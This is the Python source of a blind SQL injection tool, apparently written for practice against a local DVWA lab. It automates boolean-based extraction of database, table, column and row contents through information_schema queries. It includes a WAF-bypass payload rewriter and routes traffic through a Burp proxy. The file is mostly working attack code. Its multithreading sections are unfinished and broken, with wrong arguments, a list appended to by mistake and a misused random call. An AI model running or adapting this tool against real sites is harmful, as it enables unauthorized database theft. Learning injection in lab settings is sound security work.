#多线程优化
#命令行优化
#扩展功能
#数据可视化优化
#强化错误处理和检查
#多线程代码可以简化
from __future__ import absolute_import, unicode_literals
from termcolor import cprint
from concurrent.futures import ThreadPoolExecutor
import queue
import re
import threading
import time
from random import random
import sys
import pandas as pd
import requests
import pyfiglet
#显示所有列
pd.set_option('display.max_columns', None)
#显示所有行
pd.set_option('display.max_rows', None)
#设置value的显示长度为100，默认为50
pd.set_option('max_colwidth',200)
args=sys.argv
#工具名称
tool_name="blind_sql"



class mysql_blind():
    # 配置参数：
    way = 'get'
    url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"
    # 需要连接词的注入闭合语句
    payload = "?Submit=Submit&id=1' or "
    # 设置请求头
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Cookie': 'security=low; _ga=GA1.1.1274185995.1689247963; _ga_M95P3TTWJZ=GS1.1.1689250108.2.0.1689250108.0.0.0; PHPSESSID=qlt8kk3g8ivcfd59eoashv3m26',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Type': 'application/x-www-form-urlencoded',
        "Connection": "keep-alive"
    }
    # Cookie={'security':'low', 'PHPSESSID':'9p8upotqkiotcd7a6e6434v49d'}
    # 爆破字典
    str = 'idpsargfwtlobnqeyuhjkzxcvm_1234567890- }{(+)<=>?/@$%^*'
    # 页面正确回显的标志
    web_flag = 'exists'
    length = 50
    # 是否降低请求速度
    sleep = False
    # 代理设置,burp分析
    proxy = True
    end='--+'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    waf = False
    # 默认参数
    db = ''
    # 自定义waf函数
    # 忽略404
    ignore_404 = True
    threads =5 #多线程数：0，5，10
    def __init__(self):
        code = 200
        url = self.url
        print("\033[32m[INFO]--\033[0m test the url:  {}".format(url))
        if (self.proxy):
            rsp = requests.get(url=url, headers=self.header,
                               proxies=self.proxies)
        else:
            rsp = rsp = requests.get(url=url, headers=self.header)
        code = rsp.status_code
        print("service require cookie:".format(rsp.cookies))
        if(self.ignore_404):
            if(code !=200 and code!= 404):
                self.stu_error('request', code)
            else:
                print("\033[32m[INFO]--\033[0m successful connect")
                print()
        else:
            if code != 200:
                self.stu_error('request', code)
            else:
                print("\033[32m[INFO]--\033[0m successful connect")
                print()
        if self.db == '':
            db_len = self.count_len(type='db')
            print('\033[32m[INFO]--\033[0m database_name length is ', db_len)
            db = self.get_name(length=db_len, type='db')
            self.db = db

    # 设定绕waf的函数

    def beat_waf(self, payload):
        # print(payload)
        fl = 0
        payload = re.sub(r'--', '', payload)
        res = ''
        for i in payload:
            if i == ' ':
                if fl % 2 == 0:
                    res += '('
                    fl += 1
                else:
                    res += ')'
                    fl += 1
            if i == '#':
                res += ''
            else:
                res += i
        res = re.sub(r' ', '', res)
        res = re.sub(r'limit\(0,1\)', '', res)
        res = re.sub(r"g\)\)\)=", 'g))=', res)
        if 'sub' in res:
            res = re.sub(r"g\),", 'g)),', res)
        if 'length' in res:
            res = re.sub(r"g\)\)=", 'g)))=', res)
        res += ')'
        return res

# 获取长度
    def count_len(self, type='', table_name='', column='', limit=0):
        key = ''
        key = self.select_payload(
            type=type, table_name=table_name, column=column, limit=limit)
        for i in range(1, 50):
            payload = self.payload+"if(length({0})={1},1,0) {2}".format(key, i,self.end)
            res = self.http_query(payload)
            if self.web_flag in res.text:
                self.length = i
                break
        return self.length

    # 获取数据
    def get_name(self, length, type='', table_name='', column='', limit=0):
        flag = ''
        query = self.select_payload(
            type=type, table_name=table_name, column=column, limit=limit)
        if type != 'content':
            print("\033[32m[INFO]--\033[0m  start get {}_name ".format(type))
            print("recivied :")
        else:
            print("[status]-- please wait")
        for i in range(1, length+1):
            for j in self.str:
                payload = self.payload + \
                    "if(substring({0},{1},1)='{2}',1,0) {3}".format(query, i, j,self.end)
                res = self.http_query(payload)
                if j in '-#':
                    salt = self.payload + \
                        "if(ascii(substring({0},{1},1))={2},1,0) {3}".format(
                            query, i, ord(j),self.end)
                    s = self.asciisql(j, salt=salt)
                if self.web_flag in res.text:
                    s = j
                    if j in 'idpsardgfwtlobnqeyuhjkzxcvm':
                        salt = self.payload + \
                            "if(ascii(substring({0},{1},1))={2},1,0) {3}".format(
                                query, i, ord(j)-32,self.end)
                        s = self.asciisql(j, salt=salt)
                    if (s != ''):
                        flag += s
                        if type != 'content':
                            print(s, "--", end='')
                        else:
                            print('.', end='')
                        break
            if (self.waf):
                if (flag != ''):
                    flag += '-'
        if type != 'content':
            print()
            print("\033[32m[INFO]--\033[0m {0} query result: {1}   from ==={2} -database ==={3}==={4}===".format(
                type, flag, self.db, table_name, column))
        else:
            print()
        return flag

    def count_num(self, type='', table_name='', column=''):
        if type == 'table':
            query = "(select count(table_name) from information_schema.tables where table_schema='{}')".format(
                self.db)
        elif type == 'column':
            query = "(select count(column_name) from information_schema.columns where table_schema='{}' and table_name='{}')".format(
                self.db, table_name)
        elif type == 'content':
            query = "(select count({0}) from {1} )".format(column, table_name)
        else:
            self.stu_error(type='args')
        for i in range(1, 50):
            payload = self.payload+"if({0}={1},1,0) {2}".format(query, i,self.end)
            res = self.http_query(payload)
            if self.web_flag in res.text:
                print(
                    "\033[32m[INFO]--\033[0m query {0} count is {1}".format(type, i))
                return i
        return 50
    # 区分大小写

    def asciisql(self, j, salt):
        res = self.http_query(salt)
        if j in '-#':
            if self.web_flag in res.text:
                return j
            return ''
        else:
            if self.web_flag in res.text:
                return chr(ord(j)-32)
            else:
                return j

    def select_payload(self, type, table_name='', column='', limit=0):
        query = ''
        if type not in ['db', 'table', 'column', 'content']:
            self.stu_error(type='args')
        if type == 'db':
            query = "database()"
        elif type == 'table':
            query = "(select table_name from information_schema.tables where table_schema='{}' limit {},1)".format(
                self.db, limit)
        elif type == 'column':
            query = "(select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1)".format(
                    self.db, table_name, limit)
        elif type == 'content':
            query = "(select {0} from {1} limit {2},1)".format(
                    column, table_name,  limit)
        return query

    # 统一发送请求接口
    def http_query(self, payload):
        url = self.url
        if (self.waf):
            payload = self.beat_waf(payload)
        if (self.way == 'get'):
            url = self.url + payload
        if (self.sleep):
            time.sleep(0.3)
        if self.way == 'get':
            if (self.proxy):
                res = requests.get(
                    url=url, headers=self.header, proxies=self.proxies)
            else:
                res = requests.get(url=url, headers=self.header)
        else:
            if (self.proxy):
                res = requests.post(
                    url=self.url, headers=self.header, data=payload, proxies=self.proxies)
            else:
                res = requests.post(
                    url=self.url, headers=self.header, data=payload)
        code = res.status_code
        if(self.ignore_404):
            if code != 200 and code!= 404:
                self.stu_error("request", code)
        else:
            if code != 200:
                self.stu_error("request", code)
        return res



    # 打印相应数据
    def show_data(self, data, type=''):
        if data is None:
            print("\033[31m[ERROR]-- no data,maybe name is error\033[0m")
            print()
            exit()
        else:
            print("\033[32m[INFO]--\033[0m blind inject result--")
            print()
            if type == 'tables':  # 接收一个列表
                print("all table name:")
                print('******************************')
                for i in data:
                    print(i)
                print('******************************')
                print()
            elif type == 'columns':  # 接收一个列表
                print("all column name:")
                for table, columns in data.items():
                    print("table:  {}".format(table))
                    print("++++++++++++++++++")
                    for i in columns:
                        print(i)
                    print("++++++++++++++++++")
                    print()
            elif type == 'content':  # 接收一个字典：{table:数据帧}
                print('##############################################')
                for table, content in data.items():
                    if (content.empty):
                        print(
                            "\033[31m[ERROR]-- no data,please check args\033[0m")
                    else:
                        print(table, ':')
                        print('-----------------------')
                        print(content)
                        print('-----------------------')
                        print()
            else:
                self.stu_error(type='args')

    def stu_error(self, type, code=200):
        if type == 'request':
            # if code>=500:
            #     print("\033[31m[ERROR]  service error ,http code is 5xx\033[0m")
            if code == 301 or code == 302:
                print(
                    "\033[31m[ERROR] redirect ,maybe need right cookie, http code is{}\033[0m".format(code))
            elif code == 429:
                print("\033[31m[ERROR] http request too frequently\033[0m")
                return 0
            elif code == 400:
                print("\033[31m[ERROR] payload set error\033[0m")
            elif code == 403:
                print("\033[31m[ERROR] service refuse connect\033[0m")
            else:
                print("\033[31m[ERROR] args error\033[0m")
        if type == 'args':
            print("\033[31m[ERROR] args error\033[0m")
        print()
        exit()

    def threads(self,num):
        for i in range(num):
            t = threading.Thread(target=do_crew())
            t.start()


# 获取指定数据库所有表名，返回一个列表
def get_tables_name(obj):
    table = []
    num = obj.count_num(type='table')
    if obj.threads == 0:
        for i in range(0, num):
            tb_len = obj.count_len(type='table', limit=i)
            res = obj.get_name(length=tb_len, type='table',  limit=i)
            if (res == ''):
                break
            else:
                table.append(res)
        #多线程获取表名
    else:
        n=obj.threads
        args=[]
        for i in range(0,num):
            tb_len = obj.count_len(type='table', limit=i)
            args.append((tb_len,'table','','',i))
        with ThreadPoolExecutor() as pool:
            results=pool.map(obj.get_name,args)
            for res in results:
                if (res == ''):
                    continue
                else:
                    table.append(res)
    return table

# 获取指定表名的所有表列名，返回一个列表
def get_table_column(obj, table):
    columns = []
    num = obj.count_num(type='column', table_name=table)
    if obj.threads==0:
        for i in range(num):
            col_len = obj.count_len(type='column', table_name=table, limit=i)
            res = ctfer.get_name(length=col_len, type='column',
                                 table_name=table, limit=i)
            if (res == ''):
                break
            else:
                columns.append(res)
    else:
        args=[]
        n=obj.threads
        for i in range(num):
            col_len = obj.count_len(type='column', table_name=table, limit=i)
            args.append((col_len,'column',table,'',i))
        with ThreadPoolExecutor(n) as pool:
            results = pool.map(obj.get_name, args)
            for res in results:
                if (res == ''):
                    continue
                else:
                    table.append(res)
    return columns

# 获取指定数据,返回一个字典
def get_column_data(obj, table_name, column_name):
    # 存储每一列内容
    content = []
    num = obj.count_num(
        type='content', table_name=table_name, column=column_name)
    for i in range(num):
        col_len = obj.count_len(
            type='content', table_name=table_name, column=column_name, limit=i)
        res = obj.get_name(length=col_len, type='content',
                           table_name=table_name, column=column_name, limit=i)
        if (res == ''):
            break
        else:
            content.append(res)
    column = {column_name: content}
    return column

# 获取某数据库所有数据，返回一个多重字典
def get_current_db_data(ctfer):
    data = {}
    table_columns = {}
    # 爆出所有表名
    #单线程
    if ctfer.threads==0:
        table = get_tables_name(ctfer)
        # 爆出所有列名
        for i in table:
            columns = get_table_column(ctfer, i)
            table_columns[i] = columns

        # 爆出当前数据库所有数据
        for table, columns in table_columns.items():
            table_content = {}
            for i in columns:
                col = get_column_data(ctfer, table_name=table, column_name=i)
                for key, value in col.items():
                    table_content[key] = value
            data[table] = pd.DataFrame(table_content)
        print()
        return data
    else:
        num=ctfer.threads

#创建多线程函数
def crew(url):
    pass


def do_crew(url_queue:queue.Queue,html_queue:queue.Queue):
    while True:
        url=url_queue.get()
        html=crew(url)
        html_queue.put(html)
        time.sleep(random.randint(1, 2))


def parse(html):
    pass


def do_parse(html_queue:queue.Queue):
    while True:
        html = html_queue.get()
        result = parse(html)
        time.sleep(random.randint(1, 2))





def name_input(type):
    print("================================")
    if type == 'table':
        print("请输入表名：", end='')
        name = input()
    elif type == 'column':
        print("请输入字段名：", end='')
        name = input()
    else:
        print("error ")
        exit()
    print("================================")
    return name


def meau():
    print("-------------------功能菜单------------------")
    print("1、获取当前数据库所有数据")
    print("2、获取当前数据库所有表名")
    print("3、获取当前数据库所有列名")
    print("4、获取指定表的字段")
    print("5、获取指定表的所有数据")
    print("6、获取指定字段的内容")
    print("--------------------------------------------")
    print("请需要执行的功能:", end='')
    n = int(input())
    return n
#命令行控制器
def mode_controller():
    args=sys.argv
    if '-h' in args or '--help' in args:
        print_help()
        exit()

def print_help():
    print(f'\t{tool_name} help document')
    print(f'{tool_name} is a tool to ues to the base blind of sql inject ')
    print(f' usage:  -[options] --[args]')
    print(f'\t -h, --help, show help information and options usage')
    print('\t -u ,use the url to try')
    print('\t --proxy ,use proxy ,default use http port 8080')
    print('\t -data,')
    print('\t -cookie,')
    print('\t --waf')
    print('\t -l,--level,')

if __name__ == '__main__':
    ascii_banner = pyfiglet.figlet_format("b l i n d - s q l")
    cprint(ascii_banner, 'blue')
    mode_controller()
    table = []
    column = {}
    ctfer = mysql_blind()
    n = meau()
    if n == 1:
        data = get_current_db_data(ctfer)
        ctfer.show_data(data=data, type='content')
    elif n == 2:
        table = get_tables_name(ctfer)
        ctfer.show_data(data=table, type='tables')
    elif n == 3:
        if (len(table) == 0):
            table = get_tables_name(ctfer)
        for i in table:
            column[i] = get_table_column(ctfer, i)
        ctfer.show_data(data=column, type='columns')
    elif n == 4:
        table_name = name_input('table')
        column[table_name] = get_table_column(ctfer, table_name)
        ctfer.show_data(data=column, type='columns')
    elif n == 5:
        data = {}
        table_name = name_input('table')
        col = get_table_column(ctfer, table_name)
        table_data = {}
        for i in col:
            col = get_column_data(ctfer, table_name, i)
            for key, value in col.items():
                table_data[key] = value
        data[table_name] = pd.DataFrame(table_data)
        ctfer.show_data(data=data, type='content')
    elif n == 6:
        data = {}
        table_name = name_input('table')
        column_name = name_input('column')
        col_data = get_column_data(ctfer, table_name, column_name)
        data[table_name] = pd.DataFrame(col_data)
        ctfer.show_data(data=data, type='content')
    else:
        print("\033[31m[ERROR]-- input key error \033[0m")
        exit()
